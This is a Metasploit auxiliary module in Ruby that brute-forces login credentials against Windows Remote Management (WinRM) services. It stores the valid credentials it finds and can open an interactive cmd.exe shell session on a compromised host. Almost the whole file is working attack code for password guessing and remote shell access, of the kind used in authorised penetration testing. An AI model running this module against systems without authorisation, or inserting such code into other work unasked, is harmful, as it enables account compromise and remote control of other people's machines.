##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'metasploit/framework/credential_collection'
require 'metasploit/framework/login_scanner'
require 'metasploit/framework/login_scanner/winrm'
require 'net/winrm/connection'

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::WinRM
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::AuthBrute
  include Msf::Auxiliary::CommandShell
  include Msf::Auxiliary::Scanner

  def initialize
    super(
      'Name' => 'WinRM Login Utility',
      'Description' => %q{
        This module attempts to authenticate to a WinRM service. It currently
        works only if the remote end allows Negotiate(NTLM) authentication.
        Kerberos is not currently supported.  Please note: in order to use this
        module without SSL, the 'AllowUnencrypted' winrm option must be set.
        Otherwise adjust the port and set the SSL options in the module as appropriate.
      },
      'Author' => [ 'thelightcosine', 'smashery' ],
      'References' => [
        [ 'CVE', '1999-0502'] # Weak password
      ],
      'License' => MSF_LICENSE
    )

    deregister_options('PASSWORD_SPRAY')

    register_advanced_options(
      [
        OptEnum.new('WinrmAuth', [true, 'The Authentication mechanism to use', Msf::Exploit::Remote::AuthOption::AUTO, Msf::Exploit::Remote::AuthOption::WINRM_OPTIONS], fallbacks: ['Auth']),
        OptString.new('WinrmRhostname', [false, 'The rhostname which is required for kerberos'], fallbacks: ['RHOSTNAME']),
        OptAddress.new('DomainControllerRhost', [false, 'The resolvable rhost for the Domain Controller'])
      ]
    )
  end

  def run
    if datastore['WinrmAuth'] == Msf::Exploit::Remote::AuthOption::KERBEROS
      fail_with(Msf::Exploit::Failure::BadConfig, 'The WinrmRhostname option is required when using kerberos authentication.') if datastore['WinrmRhostname'].blank?
    end
    super
  end

  def run_host(ip)
    cred_collection = build_credential_collection(
      realm: datastore['DOMAIN'],
      username: datastore['USERNAME'],
      password: datastore['PASSWORD']
    )

    kerberos_authenticator_factory = nil
    # TODO: Should this be something else, looks like local assignment, might need `self.preferred_auth`
    preferred_auth = 'Negotiate'
    if datastore['WinrmAuth'] == Msf::Exploit::Remote::AuthOption::KERBEROS
      preferred_auth = 'Kerberos'
      kerberos_authenticator_factory = -> (username, password, realm) do
        Msf::Exploit::Remote::Kerberos::ServiceAuthenticator::HTTP.new(
          host: datastore['DomainControllerRhost'],
          hostname: datastore['WinrmRhostname'],
          realm: realm,
          username: username,
          password: password,
          timeout: 20,
          framework: framework,
          framework_module: self,
          mutual_auth: true,
          use_gss_checksum: true
        )
      end
    end

    keep_connection_alive = datastore['CreateSession']

    scanner = Metasploit::Framework::LoginScanner::WinRM.new(
      host: ip,
      port: rport,
      proxies: datastore['PROXIES'],
      cred_details: cred_collection,
      stop_on_success: datastore['STOP_ON_SUCCESS'],
      bruteforce_speed: datastore['BRUTEFORCE_SPEED'],
      connection_timeout: 10,
      framework: framework,
      framework_module: self,
      kerberos_authenticator_factory: kerberos_authenticator_factory,
      keep_connection_alive: keep_connection_alive
    )

    scanner.scan! do |result|
      credential_data = result.to_h
      credential_data.merge!(
        module_fullname: fullname,
        workspace_id: myworkspace_id
      )
      if result.success?
        credential_core = create_credential(credential_data)
        credential_data[:core] = credential_core
        create_credential_login(credential_data)

        print_good "#{ip}:#{rport} - Login Successful: #{result.credential}"
        if datastore['CreateSession']
          http_client = result.connection
          rhost = result.host
          rport = result.port
          uri = datastore['URI']
          schema = result.service_name
          ssl = schema == 'https' # Can't trust the datastore value, because the scanner does some *magic* to set it for us
          endpoint = "#{schema}://#{rhost}:#{rport}#{uri}"
          conn = Net::MsfWinRM::RexWinRMConnection.new(
            {
              endpoint: endpoint,
              host: rhost,
              port: rport,
              uri: uri,
              ssl: ssl,
              user: result.credential.public,
              password: result.credential.private,
              transport: :rexhttp,
              no_ssl_peer_verification: true,
              operation_timeout: 1, # For the WinRM server
              timeout: 20, # For the underlying HTTP client
              retry_delay: 1,
              realm: result.credential.realm,
              http_client: http_client
            }
          )
          shell = conn.shell(:stdin, {})
          session_setup(shell, rhost, rport, endpoint)
        end
      else
        invalidate_login(credential_data)
        vprint_error "#{ip}:#{rport} - LOGIN FAILED: #{result.credential} (#{result.status}: #{result.proof})"
      end
    end
  end

  def session_setup(shell, _rhost, _rport, _endpoint)
    # We use cmd rather than powershell because powershell v3 on 2012 (and maybe earlier)
    # do not seem to pass us stdout/stderr.
    interactive_process_id = shell.send_command('cmd.exe')
    sess = Msf::Sessions::WinrmCommandShell.new(shell, interactive_process_id)
    sess.platform = 'windows'
    username = datastore['USERNAME']
    password = datastore['PASSWORD']
    info = "WinRM #{username}:#{password} (#{shell.owner})"
    merge_me = {
      'USERNAME' => username,
      'PASSWORD' => password
    }

    start_session(self, info, merge_me, false, nil, sess)
  end

  def start_session(obj, info, ds_merge, _crlf = false, _sock = nil, sess = nil)
    sess.set_from_exploit(obj)
    sess.info = info

    # Clean up the stored data
    sess.exploit_datastore.merge!(ds_merge)

    framework.sessions.register(sess)
    sess.process_autoruns(datastore)

    # Notify the framework that we have a new session opening up...
    # Don't let errant event handlers kill our session
    begin
      framework.events.on_session_open(sess)
    rescue ::Exception => e
      wlog("Exception in on_session_open event handler: #{e.class}: #{e}")
      wlog("Call Stack\n#{e.backtrace.join("\n")}")
    end

    sess
  end

  def test_request
    return winrm_wql_msg('Select Name,Status from Win32_Service')
  end
end
